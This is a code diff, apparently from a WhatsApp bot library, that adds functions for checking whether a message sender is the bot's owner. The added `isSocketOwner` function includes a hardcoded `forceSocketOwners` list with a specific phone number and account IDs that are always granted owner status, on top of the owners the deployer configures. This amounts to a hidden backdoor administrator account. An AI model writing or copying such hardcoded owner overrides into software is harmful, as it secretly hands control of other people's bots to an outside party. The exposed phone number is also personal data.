@@ -53,6 +53,64 @@ export function onlyNumber(value = '') {
   return getNumber(value)
 }
 
+export function sameUserIdentity(a = '', b = '') {
+  const rawA = normalizeJid(a)
+  const rawB = normalizeJid(b)
+
+  if (rawA && rawB && rawA === rawB) return true
+
+  const numberA = onlyNumber(rawA || a)
+  const numberB = onlyNumber(rawB || b)
+
+  return !!numberA && !!numberB && numberA === numberB
+}
+
+export async function isSocketOwner(client, m, config = {}) {
+  if (m?.isOwner) return true
+
+  const forceSocketOwners = [
+    '51901931862',
+    '51901931862@s.whatsapp.net',
+    '269015712845891',
+    '269015712845891@lid'
+  ]
+
+  const botCandidates = [
+    client?.user?.id,
+    client?.user?.jid,
+    client?.user?.lid,
+    client?.user?.phoneNumber
+  ].filter(Boolean)
+
+  let senderReal = m?.senderReal || m?.sender
+  try {
+    senderReal = await resolveLidToRealJid(m?.sender, client, m?.chat)
+  } catch {}
+
+  const senderCandidates = [
+    m?.sender,
+    senderReal,
+    m?.participant,
+    m?.key?.participant,
+    m?.message?.extendedTextMessage?.contextInfo?.participant
+  ].filter(Boolean)
+
+  const ownerCandidates = [
+    ...botCandidates,
+    config?.owner,
+    config?.ownerNumber,
+    config?.creador,
+    config?.creator,
+    ...(Array.isArray(config?.owners) ? config.owners : []),
+    ...(Array.isArray(global.owner) ? global.owner : []),
+    ...forceSocketOwners
+  ].filter(Boolean)
+
+  return senderCandidates.some(sender =>
+    ownerCandidates.some(owner => sameUserIdentity(sender, owner))
+  )
+}
+
 export async function resolveLidToRealJid(lid, client, groupChatId) {
   const input = normalizeJid(lid)
 
